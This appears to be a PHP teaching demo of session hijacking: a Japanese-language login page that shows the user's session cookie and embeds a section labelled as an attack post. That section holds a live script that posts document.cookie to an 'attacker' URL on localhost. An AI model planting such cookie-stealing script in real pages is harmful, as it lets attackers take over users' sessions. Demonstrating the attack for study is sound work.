<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['username'])) {
        $_SESSION['username'] = $_POST['username'];
        session_regenerate_id(true);
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } elseif (isset($_POST['logout'])) {
        session_destroy();
        setcookie("PHPSESSID", "", time() - 3600, "/");
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>ログインフォーム</title>
</head>
<body>
    <h1>ログインフォーム</h1>

    <?php if (!isset($_SESSION['username'])): ?>
        <form method="POST">
            <label for="username">ユーザー名:</label>
            <input type="text" name="username" id="username" required>
            <button type="submit">ログイン</button>
        </form>
    <?php else: ?>
        <p>ようこそ、<?= htmlspecialchars($_SESSION['username']); ?> さん！</p>
        <p>あなたのクッキー: <?= htmlspecialchars($_COOKIE['PHPSESSID']); ?></p>
        <form method="POST">
            <button type="submit" name="logout">ログアウト</button>
        </form>

        <h2>攻撃スクリプトが含まれた投稿</h2>
        <p>
            <script>
                const attackerUrl = "http://localhost:5000";
                fetch(attackerUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    body: "cookie=" + encodeURIComponent(document.cookie)
                });
            </script>
        </p>
    <?php endif; ?>
</body>
</html>
